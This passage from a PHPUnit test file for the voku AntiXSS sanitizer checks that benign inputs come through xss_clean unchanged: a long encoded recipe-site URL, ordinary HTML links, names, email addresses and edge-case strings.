<?php

declare(strict_types=1);

use voku\helper\AntiXSS;
use voku\helper\UTF8;

/**
 * Class XssTest
 *
 * @internal
 */
final class XssTest extends \PHPUnit\Framework\TestCase
{

  // INFO: here you can find some more tests
    //
    // - https://www.xssposed.org/incidents/
    // - http://www.bioinformatics.org/phplabware/internal_utilities/htmLawed/htmLawed_TESTCASE.txt
    // - http://htmlpurifier.org/live/smoketests/xssAttacks.php
    // - http://hackingforsecurity.blogspot.de/2013/11/xss-cheat-sheet-huge-list.html

    public function testNoXssUrlWithJson()
    {
        $testArray = [
            'http://foo.bar/tpl_preview.php?pid=122&json=%7B%22recipe_id%22%3A-1%2C%22recipe_created%22%3A%22%22%2C%22recipe_title%22%3A%22vxcvxc%22%2C%22recipe_description%22%3A%22%22%2C%22recipe_yield%22%3A0%2C%22recipe_prepare_time%22%3A0%2C%22recipe_image%22%3A%22%22%2C%22recipe_legal%22%3A0%2C%22recipe_live%22%3A0%2C%22recipe_user_guid%22%3A%22%22%2C%22recipe_category_id%22%3A%5B%5D%2C%22recipe_category_name%22%3A%5B%5D%2C%22recipe_variety_id%22%3A%5B%5D%2C%22recipe_variety_name%22%3A%5B%5D%2C%22recipe_tag_id%22%3A%5B%5D%2C%22recipe_tag_name%22%3A%5B%5D%2C%22recipe_instruction_id%22%3A%5B%5D%2C%22recipe_instruction_text%22%3A%5B%5D%2C%22recipe_ingredient_id%22%3A%5B%5D%2C%22recipe_ingredient_name%22%3A%5B%5D%2C%22recipe_ingredient_amount%22%3A%5B%5D%2C%22recipe_ingredient_unit%22%3A%5B%5D%2C%22formMatchingArray%22%3A%7B%22unites%22%3A%5B%22Becher%22%2C%22Beete%22%2C%22Beutel%22%2C%22Blatt%22%2C%22Bl%5Cu00e4tter%22%2C%22Bund%22%2C%22B%5Cu00fcndel%22%2C%22cl%22%2C%22cm%22%2C%22dicke%22%2C%22dl%22%2C%22Dose%22%2C%22Dose%5C%2Fn%22%2C%22d%5Cu00fcnne%22%2C%22Ecke%28n%29%22%2C%22Eimer%22%2C%22einige%22%2C%22einige+Stiele%22%2C%22EL%22%2C%22EL%2C+geh%5Cu00e4uft%22%2C%22EL%2C+gestr.%22%2C%22etwas%22%2C%22evtl.%22%2C%22extra%22%2C%22Fl%5Cu00e4schchen%22%2C%22Flasche%22%2C%22Flaschen%22%2C%22g%22%2C%22Glas%22%2C%22Gl%5Cu00e4ser%22%2C%22gr.+Dose%5C%2Fn%22%2C%22gr.+Fl.%22%2C%22gro%5Cu00dfe%22%2C%22gro%5Cu00dfen%22%2C%22gro%5Cu00dfer%22%2C%22gro%5Cu00dfes%22%2C%22halbe%22%2C%22Halm%28e%29%22%2C%22Handvoll%22%2C%22K%5Cu00e4stchen%22%2C%22kg%22%2C%22kl.+Bund%22%2C%22kl.+Dose%5C%2Fn%22%2C%22kl.+Glas%22%2C%22kl.+Kopf%22%2C%22kl.+Scheibe%28n%29%22%2C%22kl.+St%5Cu00fcck%28e%29%22%2C%22kl.Flasche%5C%2Fn%22%2C%22kleine%22%2C%22kleinen%22%2C%22kleiner%22%2C%22kleines%22%2C%22Knolle%5C%2Fn%22%2C%22Kopf%22%2C%22K%5Cu00f6pfe%22%2C%22K%5Cu00f6rner%22%2C%22Kugel%22%2C%22Kugel%5C%2Fn%22%2C%22Kugeln%22%2C%22Liter%22%2C%22m.-gro%5Cu00dfe%22%2C%22m.-gro%5Cu00dfer%22%2C%22m.-gro%5Cu00dfes%22%2C%22mehr%22%2C%22mg%22%2C%22ml%22%2C%22Msp.%22%2C%22n.+B.%22%2C%22Paar%22%2C%22Paket%22%2C%22Pck.%22%2C%22Pkt.%22%2C%22Platte%5C%2Fn%22%2C%22Port.%22%2C%22Prise%28n%29%22%2C%22Prisen%22%2C%22Prozent+%25%22%2C%22Riegel%22%2C%22Ring%5C%2Fe%22%2C%22Rippe%5C%2Fn%22%2C%22Rolle%28n%29%22%2C%22Sch%5Cu00e4lchen%22%2C%22Scheibe%5C%2Fn%22%2C%22Schuss%22%2C%22Spritzer%22%2C%22Stange%5C%2Fn%22%2C%22St%5Cu00e4ngel%22%2C%22Stiel%5C%2Fe%22%2C%22Stiele%22%2C%22St%5Cu00fcck%28e%29%22%2C%22Tafel%22%2C%22Tafeln%22%2C%22Tasse%22%2C%22Tasse%5C%2Fn%22%2C%22Teil%5C%2Fe%22%2C%22TL%22%2C%22TL+%28geh%5Cu00e4uft%29%22%2C%22TL+%28gestr.%29%22%2C%22Topf%22%2C%22Tropfen%22%2C%22Tube%5C%2Fn%22%2C%22T%5Cu00fcte%5C%2Fn%22%2C%22viel%22%2C%22wenig%22%2C%22W%5Cu00fcrfel%22%2C%22Wurzel%22%2C%22Wurzel%5C%2Fn%22%2C%22Zehe%5C%2Fn%22%2C%22Zweig%5C%2Fe%22%5D%2C%22yield%22%3A%7B%221%22%3A%221+Portion%22%2C%222%22%3A%222+Portionen%22%2C%223%22%3A%223+Portionen%22%2C%224%22%3A%224+Portionen%22%2C%225%22%3A%225+Portionen%22%2C%226%22%3A%226+Portionen%22%2C%227%22%3A%227+Portionen%22%2C%228%22%3A%228+Portionen%22%2C%229%22%3A%229+Portionen%22%2C%2210%22%3A%2210+Portionen%22%2C%2211%22%3A%2211+Portionen%22%2C%2212%22%3A%2212+Portionen%22%7D%2C%22prepare_time%22%3A%7B%221%22%3A%22schnell%22%2C%222%22%3A%22mittel%22%2C%223%22%3A%22aufwendig%22%7D%2C%22category%22%3A%7B%221%22%3A%22Vorspeise%22%2C%222%22%3A%22Suppe%22%2C%223%22%3A%22Salat%22%2C%224%22%3A%22Hauptspeise%22%2C%225%22%3A%22Beilage%22%2C%226%22%3A%22Nachtisch%5C%2FDessert%22%2C%227%22%3A%22Getr%5Cu00e4nke%22%2C%228%22%3A%22B%5Cu00fcffet%22%2C%229%22%3A%22Fr%5Cu00fchst%5Cu00fcck%5C%2FBrunch%22%7D%2C%22variety%22%3A%7B%221%22%3A%22Basmati+Reis%22%2C%222%22%3A%22Basmati+%26amp%3B+Wild+Reis%22%2C%223%22%3A%22R%5Cu00e4ucherreis%22%2C%224%22%3A%22Jasmin+Reis%22%2C%225%22%3A%221121+Basmati+Wunderreis%22%2C%226%22%3A%22Spitzen+Langkorn+Reis%22%2C%227%22%3A%22Wildreis%22%2C%228%22%3A%22Naturreis%22%2C%229%22%3A%22Sushi+Reis%22%7D%2C%22tag--ingredient%22%3A%7B%221%22%3A%22Eier%22%2C%222%22%3A%22Gem%5Cu00fcse%22%2C%223%22%3A%22Getreide%22%2C%224%22%3A%22Fisch%22%2C%225%22%3A%22Fleisch%22%2C%226%22%3A%22Meeresfr%5Cu00fcchte%22%2C%227%22%3A%22Milchprodukte%22%2C%228%22%3A%22Obst%22%2C%229%22%3A%22Salat%22%7D%2C%22tag--preparation%22%3A%7B%2210%22%3A%22Backen%22%2C%2211%22%3A%22Blanchieren%22%2C%2212%22%3A%22Braten%5C%2FSchmoren%22%2C%2213%22%3A%22D%5Cu00e4mpfen%5C%2FD%5Cu00fcnsten%22%2C%2214%22%3A%22Einmachen%22%2C%2215%22%3A%22Frittieren%22%2C%2216%22%3A%22Gratinieren%5C%2F%5Cu00dcberbacken%22%2C%2217%22%3A%22Grillen%22%2C%2218%22%3A%22Kochen%22%7D%2C%22tag--kitchen%22%3A%7B%2219%22%3A%22Afrikanisch%22%2C%2220%22%3A%22Alpenk%5Cu00fcche%22%2C%2221%22%3A%22Asiatisch%22%2C%2222%22%3A%22Deutsch+%28regional%29%22%2C%2223%22%3A%22Franz%5Cu00f6sisch%22%2C%2224%22%3A%22Mediterran%22%2C%2225%22%3A%22Orientalisch%22%2C%2226%22%3A%22Osteurop%5Cu00e4isch%22%2C%2227%22%3A%22Skandinavisch%22%2C%2228%22%3A%22S%5Cu00fcdamerikanisch%22%2C%2229%22%3A%22US-Amerikanisch%22%2C%2230%22%3A%22%22%7D%2C%22tag--difficulty%22%3A%7B%2231%22%3A%22Einfach%22%2C%2232%22%3A%22Mittelschwer%22%2C%2233%22%3A%22Anspruchsvoll%22%7D%2C%22tag--feature%22%3A%7B%2234%22%3A%22Gut+vorzubereiten%22%2C%2235%22%3A%22Kalorienarm+%5C%2F+leicht%22%2C%2236%22%3A%22Klassiker%22%2C%2237%22%3A%22Preiswert%22%2C%2238%22%3A%22Raffiniert%22%2C%2239%22%3A%22Vegetarisch+%5C%2F+Vegan%22%2C%2240%22%3A%22Vitaminreich%22%2C%2241%22%3A%22Vollwert%22%2C%2242%22%3A%22%22%7D%2C%22tag%22%3A%7B%221%22%3A%22Eier%22%2C%222%22%3A%22Gem%5Cu00fcse%22%2C%223%22%3A%22Getreide%22%2C%224%22%3A%22Fisch%22%2C%225%22%3A%22Fleisch%22%2C%226%22%3A%22Meeresfr%5Cu00fcchte%22%2C%227%22%3A%22Milchprodukte%22%2C%228%22%3A%22Obst%22%2C%229%22%3A%22Salat%22%2C%2210%22%3A%22Backen%22%2C%2211%22%3A%22Blanchieren%22%2C%2212%22%3A%22Braten%5C%2FSchmoren%22%2C%2213%22%3A%22D%5Cu00e4mpfen%5C%2FD%5Cu00fcnsten%22%2C%2214%22%3A%22Einmachen%22%2C%2215%22%3A%22Frittieren%22%2C%2216%22%3A%22Gratinieren%5C%2F%5Cu00dcberbacken%22%2C%2217%22%3A%22Grillen%22%2C%2218%22%3A%22Kochen%22%2C%2219%22%3A%22Afrikanisch%22%2C%2220%22%3A%22Alpenk%5Cu00fcche%22%2C%2221%22%3A%22Asiatisch%22%2C%2222%22%3A%22Deutsch+%28regional%29%22%2C%2223%22%3A%22Franz%5Cu00f6sisch%22%2C%2224%22%3A%22Mediterran%22%2C%2225%22%3A%22Orientalisch%22%2C%2226%22%3A%22Osteurop%5Cu00e4isch%22%2C%2227%22%3A%22Skandinavisch%22%2C%2228%22%3A%22S%5Cu00fcdamerikanisch%22%2C%2229%22%3A%22US-Amerikanisch%22%2C%2230%22%3A%22%22%2C%2231%22%3A%22Einfach%22%2C%2232%22%3A%22Mittelschwer%22%2C%2233%22%3A%22Anspruchsvoll%22%2C%2234%22%3A%22Gut+vorzubereiten%22%2C%2235%22%3A%22Kalorienarm+%5C%2F+leicht%22%2C%2236%22%3A%22Klassiker%22%2C%2237%22%3A%22Preiswert%22%2C%2238%22%3A%22Raffiniert%22%2C%2239%22%3A%22Vegetarisch+%5C%2F+Vegan%22%2C%2240%22%3A%22Vitaminreich%22%2C%2241%22%3A%22Vollwert%22%2C%2242%22%3A%22%22%7D%7D%2C%22errorArray%22%3A%7B%22recipe_prepare_time%22%3A%22error%22%2C%22recipe_yield%22%3A%22error%22%2C%22recipe_category_name%22%3A%22error%22%2C%22recipe_tag_name%22%3A%22error%22%2C%22recipe_instruction_text%22%3A%22error%22%2C%22recipe_ingredient_name%22%3A%22error%22%7D%2C%22errorMessage%22%3A%22Bitte+f%5Cu00fclle+die+rot+markierten+Felder+korrekt+aus.%22%2C%22db%22%3A%7B%22query_count%22%3A20%7D%7D' => 'http://foo.bar/tpl_preview.php?pid=122&json=%7B%22recipe_id%22%3A-1%2C%22recipe_created%22%3A%22%22%2C%22recipe_title%22%3A%22vxcvxc%22%2C%22recipe_description%22%3A%22%22%2C%22recipe_yield%22%3A0%2C%22recipe_prepare_time%22%3A0%2C%22recipe_image%22%3A%22%22%2C%22recipe_legal%22%3A0%2C%22recipe_live%22%3A0%2C%22recipe_user_guid%22%3A%22%22%2C%22recipe_category_id%22%3A%5B%5D%2C%22recipe_category_name%22%3A%5B%5D%2C%22recipe_variety_id%22%3A%5B%5D%2C%22recipe_variety_name%22%3A%5B%5D%2C%22recipe_tag_id%22%3A%5B%5D%2C%22recipe_tag_name%22%3A%5B%5D%2C%22recipe_instruction_id%22%3A%5B%5D%2C%22recipe_instruction_text%22%3A%5B%5D%2C%22recipe_ingredient_id%22%3A%5B%5D%2C%22recipe_ingredient_name%22%3A%5B%5D%2C%22recipe_ingredient_amount%22%3A%5B%5D%2C%22recipe_ingredient_unit%22%3A%5B%5D%2C%22formMatchingArray%22%3A%7B%22unites%22%3A%5B%22Becher%22%2C%22Beete%22%2C%22Beutel%22%2C%22Blatt%22%2C%22Bl%5Cu00e4tter%22%2C%22Bund%22%2C%22B%5Cu00fcndel%22%2C%22cl%22%2C%22cm%22%2C%22dicke%22%2C%22dl%22%2C%22Dose%22%2C%22Dose%5C%2Fn%22%2C%22d%5Cu00fcnne%22%2C%22Ecke%28n%29%22%2C%22Eimer%22%2C%22einige%22%2C%22einige+Stiele%22%2C%22EL%22%2C%22EL%2C+geh%5Cu00e4uft%22%2C%22EL%2C+gestr.%22%2C%22etwas%22%2C%22evtl.%22%2C%22extra%22%2C%22Fl%5Cu00e4schchen%22%2C%22Flasche%22%2C%22Flaschen%22%2C%22g%22%2C%22Glas%22%2C%22Gl%5Cu00e4ser%22%2C%22gr.+Dose%5C%2Fn%22%2C%22gr.+Fl.%22%2C%22gro%5Cu00dfe%22%2C%22gro%5Cu00dfen%22%2C%22gro%5Cu00dfer%22%2C%22gro%5Cu00dfes%22%2C%22halbe%22%2C%22Halm%28e%29%22%2C%22Handvoll%22%2C%22K%5Cu00e4stchen%22%2C%22kg%22%2C%22kl.+Bund%22%2C%22kl.+Dose%5C%2Fn%22%2C%22kl.+Glas%22%2C%22kl.+Kopf%22%2C%22kl.+Scheibe%28n%29%22%2C%22kl.+St%5Cu00fcck%28e%29%22%2C%22kl.Flasche%5C%2Fn%22%2C%22kleine%22%2C%22kleinen%22%2C%22kleiner%22%2C%22kleines%22%2C%22Knolle%5C%2Fn%22%2C%22Kopf%22%2C%22K%5Cu00f6pfe%22%2C%22K%5Cu00f6rner%22%2C%22Kugel%22%2C%22Kugel%5C%2Fn%22%2C%22Kugeln%22%2C%22Liter%22%2C%22m.-gro%5Cu00dfe%22%2C%22m.-gro%5Cu00dfer%22%2C%22m.-gro%5Cu00dfes%22%2C%22mehr%22%2C%22mg%22%2C%22ml%22%2C%22Msp.%22%2C%22n.+B.%22%2C%22Paar%22%2C%22Paket%22%2C%22Pck.%22%2C%22Pkt.%22%2C%22Platte%5C%2Fn%22%2C%22Port.%22%2C%22Prise%28n%29%22%2C%22Prisen%22%2C%22Prozent+%25%22%2C%22Riegel%22%2C%22Ring%5C%2Fe%22%2C%22Rippe%5C%2Fn%22%2C%22Rolle%28n%29%22%2C%22Sch%5Cu00e4lchen%22%2C%22Scheibe%5C%2Fn%22%2C%22Schuss%22%2C%22Spritzer%22%2C%22Stange%5C%2Fn%22%2C%22St%5Cu00e4ngel%22%2C%22Stiel%5C%2Fe%22%2C%22Stiele%22%2C%22St%5Cu00fcck%28e%29%22%2C%22Tafel%22%2C%22Tafeln%22%2C%22Tasse%22%2C%22Tasse%5C%2Fn%22%2C%22Teil%5C%2Fe%22%2C%22TL%22%2C%22TL+%28geh%5Cu00e4uft%29%22%2C%22TL+%28gestr.%29%22%2C%22Topf%22%2C%22Tropfen%22%2C%22Tube%5C%2Fn%22%2C%22T%5Cu00fcte%5C%2Fn%22%2C%22viel%22%2C%22wenig%22%2C%22W%5Cu00fcrfel%22%2C%22Wurzel%22%2C%22Wurzel%5C%2Fn%22%2C%22Zehe%5C%2Fn%22%2C%22Zweig%5C%2Fe%22%5D%2C%22yield%22%3A%7B%221%22%3A%221+Portion%22%2C%222%22%3A%222+Portionen%22%2C%223%22%3A%223+Portionen%22%2C%224%22%3A%224+Portionen%22%2C%225%22%3A%225+Portionen%22%2C%226%22%3A%226+Portionen%22%2C%227%22%3A%227+Portionen%22%2C%228%22%3A%228+Portionen%22%2C%229%22%3A%229+Portionen%22%2C%2210%22%3A%2210+Portionen%22%2C%2211%22%3A%2211+Portionen%22%2C%2212%22%3A%2212+Portionen%22%7D%2C%22prepare_time%22%3A%7B%221%22%3A%22schnell%22%2C%222%22%3A%22mittel%22%2C%223%22%3A%22aufwendig%22%7D%2C%22category%22%3A%7B%221%22%3A%22Vorspeise%22%2C%222%22%3A%22Suppe%22%2C%223%22%3A%22Salat%22%2C%224%22%3A%22Hauptspeise%22%2C%225%22%3A%22Beilage%22%2C%226%22%3A%22Nachtisch%5C%2FDessert%22%2C%227%22%3A%22Getr%5Cu00e4nke%22%2C%228%22%3A%22B%5Cu00fcffet%22%2C%229%22%3A%22Fr%5Cu00fchst%5Cu00fcck%5C%2FBrunch%22%7D%2C%22variety%22%3A%7B%221%22%3A%22Basmati+Reis%22%2C%222%22%3A%22Basmati+%26amp%3B+Wild+Reis%22%2C%223%22%3A%22R%5Cu00e4ucherreis%22%2C%224%22%3A%22Jasmin+Reis%22%2C%225%22%3A%221121+Basmati+Wunderreis%22%2C%226%22%3A%22Spitzen+Langkorn+Reis%22%2C%227%22%3A%22Wildreis%22%2C%228%22%3A%22Naturreis%22%2C%229%22%3A%22Sushi+Reis%22%7D%2C%22tag--ingredient%22%3A%7B%221%22%3A%22Eier%22%2C%222%22%3A%22Gem%5Cu00fcse%22%2C%223%22%3A%22Getreide%22%2C%224%22%3A%22Fisch%22%2C%225%22%3A%22Fleisch%22%2C%226%22%3A%22Meeresfr%5Cu00fcchte%22%2C%227%22%3A%22Milchprodukte%22%2C%228%22%3A%22Obst%22%2C%229%22%3A%22Salat%22%7D%2C%22tag--preparation%22%3A%7B%2210%22%3A%22Backen%22%2C%2211%22%3A%22Blanchieren%22%2C%2212%22%3A%22Braten%5C%2FSchmoren%22%2C%2213%22%3A%22D%5Cu00e4mpfen%5C%2FD%5Cu00fcnsten%22%2C%2214%22%3A%22Einmachen%22%2C%2215%22%3A%22Frittieren%22%2C%2216%22%3A%22Gratinieren%5C%2F%5Cu00dcberbacken%22%2C%2217%22%3A%22Grillen%22%2C%2218%22%3A%22Kochen%22%7D%2C%22tag--kitchen%22%3A%7B%2219%22%3A%22Afrikanisch%22%2C%2220%22%3A%22Alpenk%5Cu00fcche%22%2C%2221%22%3A%22Asiatisch%22%2C%2222%22%3A%22Deutsch+%28regional%29%22%2C%2223%22%3A%22Franz%5Cu00f6sisch%22%2C%2224%22%3A%22Mediterran%22%2C%2225%22%3A%22Orientalisch%22%2C%2226%22%3A%22Osteurop%5Cu00e4isch%22%2C%2227%22%3A%22Skandinavisch%22%2C%2228%22%3A%22S%5Cu00fcdamerikanisch%22%2C%2229%22%3A%22US-Amerikanisch%22%2C%2230%22%3A%22%22%7D%2C%22tag--difficulty%22%3A%7B%2231%22%3A%22Einfach%22%2C%2232%22%3A%22Mittelschwer%22%2C%2233%22%3A%22Anspruchsvoll%22%7D%2C%22tag--feature%22%3A%7B%2234%22%3A%22Gut+vorzubereiten%22%2C%2235%22%3A%22Kalorienarm+%5C%2F+leicht%22%2C%2236%22%3A%22Klassiker%22%2C%2237%22%3A%22Preiswert%22%2C%2238%22%3A%22Raffiniert%22%2C%2239%22%3A%22Vegetarisch+%5C%2F+Vegan%22%2C%2240%22%3A%22Vitaminreich%22%2C%2241%22%3A%22Vollwert%22%2C%2242%22%3A%22%22%7D%2C%22tag%22%3A%7B%221%22%3A%22Eier%22%2C%222%22%3A%22Gem%5Cu00fcse%22%2C%223%22%3A%22Getreide%22%2C%224%22%3A%22Fisch%22%2C%225%22%3A%22Fleisch%22%2C%226%22%3A%22Meeresfr%5Cu00fcchte%22%2C%227%22%3A%22Milchprodukte%22%2C%228%22%3A%22Obst%22%2C%229%22%3A%22Salat%22%2C%2210%22%3A%22Backen%22%2C%2211%22%3A%22Blanchieren%22%2C%2212%22%3A%22Braten%5C%2FSchmoren%22%2C%2213%22%3A%22D%5Cu00e4mpfen%5C%2FD%5Cu00fcnsten%22%2C%2214%22%3A%22Einmachen%22%2C%2215%22%3A%22Frittieren%22%2C%2216%22%3A%22Gratinieren%5C%2F%5Cu00dcberbacken%22%2C%2217%22%3A%22Grillen%22%2C%2218%22%3A%22Kochen%22%2C%2219%22%3A%22Afrikanisch%22%2C%2220%22%3A%22Alpenk%5Cu00fcche%22%2C%2221%22%3A%22Asiatisch%22%2C%2222%22%3A%22Deutsch+%28regional%29%22%2C%2223%22%3A%22Franz%5Cu00f6sisch%22%2C%2224%22%3A%22Mediterran%22%2C%2225%22%3A%22Orientalisch%22%2C%2226%22%3A%22Osteurop%5Cu00e4isch%22%2C%2227%22%3A%22Skandinavisch%22%2C%2228%22%3A%22S%5Cu00fcdamerikanisch%22%2C%2229%22%3A%22US-Amerikanisch%22%2C%2230%22%3A%22%22%2C%2231%22%3A%22Einfach%22%2C%2232%22%3A%22Mittelschwer%22%2C%2233%22%3A%22Anspruchsvoll%22%2C%2234%22%3A%22Gut+vorzubereiten%22%2C%2235%22%3A%22Kalorienarm+%5C%2F+leicht%22%2C%2236%22%3A%22Klassiker%22%2C%2237%22%3A%22Preiswert%22%2C%2238%22%3A%22Raffiniert%22%2C%2239%22%3A%22Vegetarisch+%5C%2F+Vegan%22%2C%2240%22%3A%22Vitaminreich%22%2C%2241%22%3A%22Vollwert%22%2C%2242%22%3A%22%22%7D%7D%2C%22errorArray%22%3A%7B%22recipe_prepare_time%22%3A%22error%22%2C%22recipe_yield%22%3A%22error%22%2C%22recipe_category_name%22%3A%22error%22%2C%22recipe_tag_name%22%3A%22error%22%2C%22recipe_instruction_text%22%3A%22error%22%2C%22recipe_ingredient_name%22%3A%22error%22%7D%2C%22errorMessage%22%3A%22Bitte+f%5Cu00fclle+die+rot+markierten+Felder+korrekt+aus.%22%2C%22db%22%3A%7B%22query_count%22%3A20%7D%7D',
        ];

        foreach ($testArray as $before => $after) {
            static::assertSame($after, (new AntiXSS())->xss_clean($before), 'testing: ' . $before);
        }
    }

    public function testNoXss()
    {
        // init
        $antiXss = new AntiXSS();

        $testArray = [
            '<nav class="top-bar" data-topbar data-options="back_text: Zurück"><ul><li>foo</li><li>bar</li></ul></nav>'                                                                                                                               => '<nav class="top-bar" data-topbar data-options="back_text: Zurück"><ul><li>foo</li><li>bar</li></ul></nav>',
            '<a href="http://suckup.de/about">About</a>'                                                                                                                                                                                              => '<a href="http://suckup.de/about">About</a>',
            "<a href='http://suckup.de/about'>About</a>"                                                                                                                                                                                              => "<a href='http://suckup.de/about'>About</a>",
            '<a href="http://moelleken.org/Kontakt/" class="mail"><i class="fa fa-envelope fa-3x"></i></a>'                                                                                                                                           => '<a href="http://moelleken.org/Kontakt/" class="mail"><i class="fa fa-envelope fa-3x"></i></a>',
            '<a href="https://plus.google.com/u/0/115714615799970937533/about" rel="me" title="Add Me To Your Circle"><i class="fa fa-google-plus fa-3x"></i></a>'                                                                                    => '<a href="https://plus.google.com/u/0/115714615799970937533/about" rel="me" title="Add Me To Your Circle"><i class="fa fa-google-plus fa-3x"></i></a>',
            'eval is evil and xss is bad, but this is only a string : ...'                                                                                                                                                                            => 'eval is evil and xss is bad, but this is only a string : ...',
            '<a href="https://test.com?lall=123&lall=312">test&amp;</a>'                                                                                                                                                                              => '<a href="https://test.com?lall=123&lall=312">test&amp;</a>',
            '&lt;a href="https://test.com?lall=123&lall=312">test&amp;&lt;/a&gt;'                                                                                                                                                                     => '&lt;a href="https://test.com?lall=123&lall=312">test&amp;&lt;/a&gt;',
            '<a href="https://test.com?lall=123&lall=312&lall=999">test&amp;</a>'                                                                                                                                                                     => '<a href="https://test.com?lall=123&lall=312&lall=999">test&amp;</a>',
            '<p>&lt;h1&gt;<a href="https://mbd.baidu.com/newspage/data/landingsuper?context=%7B%22nid%22%3A%22news_15446515888862039806%22%7D&amp;n_type=0&amp;p_from=1" target="_blank">Special url</a>&lt;/h1&gt; User content %7B%7B Test 123</p>' => '<p>&lt;h1&gt;<a href="https://mbd.baidu.com/newspage/data/landingsuper?context=%7B%22nid%22%3A%22news_15446515888862039806%22%7D&amp;n_type=0&amp;p_from=1" target="_blank">Special url</a>&lt;/h1&gt; User content %7B%7B Test 123</p>',
            '<a href="https://mbd.baidu.com/newspage/data/landingsuper?context=%7B%22nid%22%3A%22news_15446515888862039806%22%7D&amp;n_type=0&amp;p_from=1" target="_blank">Valid Link</a>'                                                           => '<a href="https://mbd.baidu.com/newspage/data/landingsuper?context=%7B%22nid%22%3A%22news_15446515888862039806%22%7D&amp;n_type=0&amp;p_from=1" target="_blank">Valid Link</a>',
            '<a href="https://mbd.baidu.com/newspage/data/landingsuper?context=%7B%22nid%22%3A%22news_15446515888862039806%22%7D&n_type=0&p_from=1" target="_blank">Valid Link</a>'                                                                   => '<a href="https://mbd.baidu.com/newspage/data/landingsuper?context=%7B%22nid%22%3A%22news_15446515888862039806%22%7D&n_type=0&p_from=1" target="_blank">Valid Link</a>',
            ''                                                                                                                                                                                                                                        => '',
            ' '                                                                                                                                                                                                                                       => ' ',
            null                                                                                                                                                                                                                                      => '',
            true                                                                                                                                                                                                                                      => 1,
            false                                                                                                                                                                                                                                     => 0,
            0                                                                                                                                                                                                                                         => 0,
            '0.0'                                                                                                                                                                                                                                     => '0.0',
            'GOM-KC-350+550'                                                                                                                                                                                                                          => 'GOM-KC-350+550',
            'Chassis+FanTray10G-VSS'                                                                                                                                                                                                                  => 'Chassis+FanTray10G-VSS', // issue #34
            '3+ years of experience'                                                                                                                                                                                                                  => '3+ years of experience',
            ' foo ' . "\xe2\x80\xa8" . ' öäü' . "\xe2\x80\xa9"                                                                                                                                                                                        => ' foo ' . "\xe2\x80\xa8" . ' öäü' . "\xe2\x80\xa9",
            " foo\t foo "                                                                                                                                                                                                                             => ' foo	 foo ',
            'a="get";'                                                                                                                                                                                                                                => 'a="get";',
            '<x 1=">" onxxx=1 (text outside tag)'                                                                                                                                                                                                     => '<x 1=">" onxxx=1 (text outside tag)',
            '<a href="https://url.com" target="_blank" style="color: rgb(0, 161, 222);">Click Here for the 2017 Summit Review</a>'                                                                                                                    => '<a href="https://url.com" target="_blank" style="color: rgb(0, 161, 222);">Click Here for the 2017 Summit Review</a>',
            '<a href="https://url.com" target="_blank">Click Here for the 2017 Summit Review</a>'                                                                                                                                                     => '<a href="https://url.com" target="_blank">Click Here for the 2017 Summit Review</a>',
            'foo Mondragon bar'                                                                                                                                                                                                                       => 'foo Mondragon bar',
            'Mondragon'                                                                                                                                                                                                                               => 'Mondragon',
            'Mondragßon'                                                                                                                                                                                                                              => 'Mondragßon',
            'MONDRAGÓN'                                                                                                                                                                                                                               => 'MONDRAGÓN',
            'MONDRAGÓN '                                                                                                                                                                                                                              => 'MONDRAGÓN ',
            ' MONDRAGÓN'                                                                                                                                                                                                                              => ' MONDRAGÓN',
            ' MONDRAGÓN '                                                                                                                                                                                                                             => ' MONDRAGÓN ',
            '!MONDRAGÓN!'                                                                                                                                                                                                                             => '!MONDRAGÓN!',
            '!MONDRAGÓN'                                                                                                                                                                                                                              => '!MONDRAGÓN',
            'MONDRAGÓN!'                                                                                                                                                                                                                              => 'MONDRAGÓN!',
            'alert || document || write || Mondragon'                                                                                                                                                                                                 => 'alert || document || write || Mondragon',
            'DE VAL HERNANDEZ || DE VAL LOPEZ'                                                                                                                                                                                                        => 'DE VAL HERNANDEZ || DE VAL LOPEZ',
            ' foobar DE VAL HERNANDEZ foo bar '                                                                                                                                                                                                       => ' foobar DE VAL HERNANDEZ foo bar ',
            'ANAMNESI E VAL.DEFINITE BREVI ORTO'                                                                                                                                                                                                      => 'ANAMNESI E VAL.DEFINITE BREVI ORTO',
            'ANAMNESI E VAL!DEFINITE BREVI ORTO'                                                                                                                                                                                                      => 'ANAMNESI E VAL!DEFINITE BREVI ORTO',
            'ANAMNESI E VAL?DEFINITE BREVI ORTO'                                                                                                                                                                                                      => 'ANAMNESI E VAL?DEFINITE BREVI ORTO',
            'ANAMNESI E VAL DEFINITE BREVI ORTO'                                                                                                                                                                                                      => 'ANAMNESI E VAL DEFINITE BREVI ORTO',
            'ANAMNESI E VALDEFINITE BREVI ORTO'                                                                                                                                                                                                       => 'ANAMNESI E VALDEFINITE BREVI ORTO',
            '<styler_tester@gmail.com>'                                                                                                                                                                                                               => '<styler_tester@gmail.com>',
            'styler_tester@gmail.com'                                                                                                                                                                                                                 => 'styler_tester@gmail.com',
            '<xxxnonstop@gmail.com>'                                                                                                                                                                                                                  => '<xxxnonstop@gmail.com>',
            '<video@gmail.com>'                                                                                                                                                                                                                       => '<video@gmail.com>',
            '<script@gmail.com>'                                                                                                                                                                                                                      => '<script@gmail.com>',
            'xxxnonstop@hotmail.com'                                                                                                                                                                                                                  => 'xxxnonstop@hotmail.com',
            ' xxxnonstop@hotmail.com '                                                                                                                                                                                                                => ' xxxnonstop@hotmail.com ',
            'cyyhqLRMvBs:APA91bH1ueQlBr8GXbQxNw9SpzldRAeYK4mw-Yqhw44v7oEoRgxyoFAfQc_2A3dc6X_vp3HpmPGh4NAItAAyv9pvoQbJZXUotjX0427y1hG_vCtr34UnEecqAGsXwkevitdHZIp9juRC'                                                                                => 'cyyhqLRMvBs:APA91bH1ueQlBr8GXbQxNw9SpzldRAeYK4mw-Yqhw44v7oEoRgxyoFAfQc_2A3dc6X_vp3HpmPGh4NAItAAyv9pvoQbJZXUotjX0427y1hG_vCtr34UnEecqAGsXwkevitdHZIp9juRC',
            'product/category%bf%27'                                                                                                                                                                                                                  => 'product/category%bf%27',
            'product/category%0b' . "\0"                                                                                                                                                                                                              => 'product/category%0b' . "\0",
            'foo --> bar'                                                                                                                                                                                                                             => 'foo --> bar',
            'onendsomething'                                                                                                                                                                                                                          => 'onendsomething',
            'something onendtest'                                                                                                                                                                                                                     => 'something onendtest',
            'something onend another thing'                                                                                                                                                                                                           => 'something onend another thing',
            'something@onendtest'                                                                                                                                                                                                                     => 'something@onendtest',
            'something-onendtest'                                                                                                                                                                                                                     => 'something-onendtest',
            'something,onendtest'                                                                                                                                                                                                                     => 'something,onendtest',
            'something*onendtest'                                                                                                                                                                                                                     => 'something*onendtest',
            'something(onendtest'                                                                                                                                                                                                                     => 'something(onendtest',
